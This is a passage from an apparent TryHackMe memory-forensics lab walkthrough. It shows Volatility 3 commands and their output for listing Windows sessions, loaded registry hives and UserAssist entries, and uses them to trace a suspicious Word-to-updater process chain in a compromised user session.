  HFDI      hfdi</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ERF       erf</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cFiles</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbTotalBytes</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PERROR    perr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SPILLERR  se</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSpill</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achSelf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achMsg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbMAX_LINE</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achLine</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achLocation</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achFile</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achDest</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achCabPath</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fContinuationCabinet</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fShowReserveInfo</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fNextCabCalled</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    CABINET   acab</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achZap</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achCabinetFile</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       cArgv</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">pArgv</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       fDestructive</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    USHORT    iCurrentFolder</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SESSION</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">PSESSION</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>The Windows <strong>sessions</strong> plugin (<strong>windows.session</strong>) walks through these kernel and user session management structures to extract details like session IDs, user SIDs, logon types (e.g., console, RDP), and logon timestamps. These values are stored in the memory of the csrss.exe, winlogon.exe, and other system processes tied to interactive sessions.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="logged-sessions">Logged Sessions<a href="#logged-sessions" class="hash-link" aria-label="Direct link to Logged Sessions" title="Direct link to Logged Sessions" translate="no">​</a></h3>
<p>We can explore the sessions using Volatility. Let&#x27;s run the command <code>vol -f THM-WIN-001_071528_07052025.mem windows.sessions &gt; sessions.txt</code> to save the output to a file <code>sessions.txt</code> for further analysis.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme</span><span class="token variable" style="color:#36acaa">$vol</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> THM-WIN-001_071528_07052025.mem windows.sessions </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> sessions.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> sessions.txt </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Session ID  Session Type  Process ID  Process Name        User Name                         Create Time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------  ------------- ----------- ------------------- --------------------------------  -------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">           System              -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:48.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">92</span><span class="token plain">          Registry            -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:44.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">324</span><span class="token plain">         smss.exe            -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:48.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">9264</span><span class="token plain">        msedge.exe          -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:11.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">10100</span><span class="token plain">       SystemSettings      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">6836</span><span class="token plain">        ApplicationFra      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">8408</span><span class="token plain">        UserOOBEBroker      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">3276</span><span class="token plain">        svchost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:10:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7376</span><span class="token plain">        TextInputHost.      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:11:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7468</span><span class="token plain">        dllhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:11:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">5952</span><span class="token plain">        cmd.exe             </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:43.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3144</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:43.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">828</span><span class="token plain">         ShellExperienc      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">3548</span><span class="token plain">        RuntimeBroker.      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">        WINWORD.EXE         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:04.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3392</span><span class="token plain">        pdfupdater.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3932</span><span class="token plain">        ai.exe              </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">2576</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">10084</span><span class="token plain">       windows-update      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">10032</span><span class="token plain">       updater.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:56.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">432</span><span class="token plain">         cmd.exe             </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">4592</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">6984</span><span class="token plain">        powershell.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:39.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">2572</span><span class="token plain">        SearchProtocol      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:23.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7788</span><span class="token plain">        FTK Imager.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:28.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">9920</span><span class="token plain">        dllhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:42.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">1884</span><span class="token plain">        MemCompression      -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:49.000000 UTC</span><br></span></code></pre></div></div>
<p><strong>Note</strong>: When running Volatility for the first time, it will take a few minutes for it to start up</p>
<p>The operator user session (Session <strong>ID 1</strong>) stands out due to a clear sequence of suspicious actions. Within seconds, a chain of processes was launched under this user, pointing to active engagement rather than background tasks. The timeline and consistent user context suggest the session was compromised and later used by an attacker.</p>
<ul>
<li class="">Suspicious session: Activity tied to user operator with Session <strong>ID 1</strong>.</li>
<li class="">Malicious process chain: <strong>WINWORD.EXE</strong> → <strong>pdfupdater.exe</strong> → <strong>windows-update.exe</strong> → <strong>updater.exe</strong>.</li>
<li class="">All processes were executed under the same interactive session.</li>
<li class="">Post-exploitation behavior: cmd.exe (<strong>PID 432</strong>) and powershell.exe (<strong>PID 6984</strong>) appeared after <strong>updater.exe</strong>.</li>
<li class="">The attacker likely gained control and began issuing commands.</li>
<li class="">Evidence points to a hijacked user session leveraged after initial access.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="find-loaded-registry-hives">Find Loaded Registry Hives<a href="#find-loaded-registry-hives" class="hash-link" aria-label="Direct link to Find Loaded Registry Hives" title="Direct link to Find Loaded Registry Hives" translate="no">​</a></h3>
<p>Another important artefact to check is the <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry" target="_blank" rel="noopener noreferrer" class="">Windows Registry</a>, which holds a wide range of user and system configuration data, including details about recently used files, executed programs, wireless connections, and more. When a registry hive (like <strong>NTUSER.DAT</strong> or <strong>SYSTEM</strong>) is loaded into memory, it means the user was active and interacting with the system. By identifying which registry hives were present in memory at the time of acquisition, we can tie specific user behavior to particular accounts.</p>
<p>Volatility locates loaded registry hives by scanning memory for instances of the <strong>CMHIVE</strong> kernel structure (this structure is undocumented, but we can find some information about it <a href="https://www.nirsoft.net/kernel_struct/vista/CMHIVE.html" target="_blank" rel="noopener noreferrer" class="">here</a>). These hives are typically loaded into memory by the Windows kernel during boot or user login. The <strong>windows.registry.hivelist</strong> plugin walks through the kernel&#x27;s HiveList. Each entry contains the virtual memory address of the hive and the path where it was originally stored on disk (e.g., <strong>C:\Users\&lt;USERNAME&gt;\NTUSER.DAT</strong>).</p>
<p>Let&#x27;s use the command <code>vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist &gt; hivelist.txt</code> to inspect and save the output to the file hivelist.txt, and analyze the output:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ vol </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> THM-WIN-001_071528_07052025.mem windows.registry.hivelist </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> hivelist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> hivelist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Offset              FileFullPath                                                                                                                                            File output</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c63e66000                                                                                                                                                              Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c63e7d000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">REGISTRY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM                                                                                                                                Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6867b000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ServiceProfiles</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">NetworkService</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Local</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">DeliveryOptimization</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">State</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">dosvcState.dat                                 Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6878d000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat                                                                                                                        Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c68796000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Local</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsrClass.dat                                                                                      Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c69c6c000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppCompat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Programs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Amcache.hve                                                                                                           Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6a63a000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppRepository</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Packages</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">MicrosoftWindows.Client.CBS_1000.19061.1000.0_x64__cw5n1h2txyewy</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ActivationStore.dat        Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p>As the output above displays, we can confirm that the registry hive for the user operator was fully loaded into memory at the time the memory dump was taken, including both the main <strong>ntuser.dat</strong> file and associated user-specific application settings under <strong>UsrClass.dat</strong>. This strongly indicates that the operator account was not only logged in but also actively interacting with the system, but does not show that any potential interaction occurred.</p>
<p>Several registry entries from the <code>AppData\Local\Packages</code> path show traces of modern Windows UWP applications being accessed or configured, such as <strong>StartMenuExperienceHost</strong>, <strong>Search</strong>, <strong>ShellExperienceHost</strong>, and <strong>LockApp</strong>, all linked to the user <strong>operator</strong>. The presence of these user hives in memory supports the suspicion raised by the active process tree, especially since this user is connected to the suspicious process involving <strong>WINWORD.EXE</strong>, pdfupdater.exe, and the possible post-exploitation phase.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="graphical-interface-activity">Graphical Interface Activity<a href="#graphical-interface-activity" class="hash-link" aria-label="Direct link to Graphical Interface Activity" title="Direct link to Graphical Interface Activity" translate="no">​</a></h3>
<p><a href="https://www.magnetforensics.com/blog/artifact-profile-userassist/" target="_blank" rel="noopener noreferrer" class=""><strong>UserAssist</strong></a>, an undocumented registry that tracks executables launched by the user through the graphical interface, helps us understand which programs a user interacted with through the graphical interface. It tracks applications launched from the <strong>Start Menu</strong>, <strong>Desktop</strong>, or <strong>Explorer</strong>, including tools like <strong>cmd.exe</strong>, <strong>powershell.exe</strong>, and custom executables. We can use this information to establish what the user actually ran, even if the evidence of execution is gone from the disk or event logs. Seeing something like <strong>powershell.exe</strong> or <strong>regsvr32.exe</strong> in <strong>UserAssist</strong> shortly before a compromise can signal direct user-driven activity, which is critical when trying to determine intent and trace actions to specific accounts. This technique is used in the wild by threat actors like the <strong>Raspberry Robin worm</strong>.</p>
<p>The <strong>windows.registry.userassist</strong> plugin in Volatility reads from the <strong>NTUSER.DAT</strong> hive, a Windows registry hive file that stores a user&#x27;s settings and preferences, specifically under the <strong>Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</strong> key. Each entry is <strong>ROT13-encoded</strong> and includes details such as the application path, a run counter, and a timestamp of the last time it was launched.</p>
<p>Let&#x27;s perform the command <code>vol -f THM-WIN-001_071528_07052025.mem windows.registry.userassist &gt; userassist.txt</code> and investigate the output by looking at it using <code>cat userassist.txt</code></p>
